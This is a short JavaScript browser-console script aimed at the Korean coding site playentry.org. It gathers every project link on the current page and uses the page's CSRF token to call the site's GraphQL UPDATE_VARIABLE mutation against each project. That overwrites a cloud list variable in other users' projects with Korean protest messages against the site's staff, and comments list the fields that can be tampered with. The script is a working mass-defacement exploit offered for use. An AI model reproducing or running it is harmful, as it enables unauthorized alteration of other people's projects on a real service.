sus = function(path) {
path = path.match(/\/project\/([a-f0-9]+)/)

if (!path)
  throw new Error('유효하지 않은 주소')

path = path[1]

/*
사용 가능 field

필수
id (string) - id, 기존에 존재하던 변수/리스트와 id 일치시켜야 함 (brih - 초시계, 1vu8 - 대답)

선택
variableType ('stt' | 'answer' | 'list' | 'slide' | 'timer' | 'variable') - 변수 타입
name (string) - 이름, string으로 하지 않으면 작품이 튕김
value (any) - 값
object (string) - 특정 오브젝트에서 사용하는 변수인지 여부 (id 작성)
isCloud (bool) - 공유 변수인지 여부 (이거 true로 안하면 빠르게 사라짐)
isRealTime (bool) - 실시간 변수인지 여부
cloudDate (string) - 클라우드 변수 저장 시점
visible (bool) - 보이는 지 여부
x (bool) - x 좌표
y (bool) - y 좌표

리스트 전용
array ({data: any}[]) - 리스트 값
width (number) - 리스트의 가로 크기
height (number) - 리스트의 세로 크기
*/

const variableEdit = [
  {
    id: "1vu8",
    isCloud: true,
    visible: true,
    variableType: "list",
    name: "엔트리팀",
    x: -177,
    y: -90,
    width: 345,
    height: 192,
    array: [
      {data: "제건, 문의 답변 제대로 해줄 생각 없음"},
      {data: "허구한 날 이유도 모르게 검열, 정지"},
      {data: "엔트리에서 생기는 버그 수정할 능력도 없음"},
      {data: "유저들이 댓글로 항의해도 볼 생각도 없음"},
    ]
  }
]

const csrfToken = __NEXT_DATA__.props.initialProps.csrfToken

fetch("https://playentry.org/graphql/UPDATE_VARIABLE", {
  "headers": {
    "CSRF-Token": csrfToken,
    "content-type": "application/json",
    "x-client-type": "Client"
  },
  "body": JSON.stringify({
    "query": "\n    mutation UPDATE_VARIABLE($id: ID!, $variables: JSON) {\n        updateVariable(id: $id, variables: $variables) {\n            status\n            result\n        }\n    }\n",
    "variables": {
      "variables": variableEdit,
      "id": path
    }
  }),
  "method": "POST"
});
}

a = [...document.getElementsByClassName('tagmanagerundefined')]
b = a.map(x=>x.href)
c = b.filter(x=>!!x)

c.map(x=>sus(x))
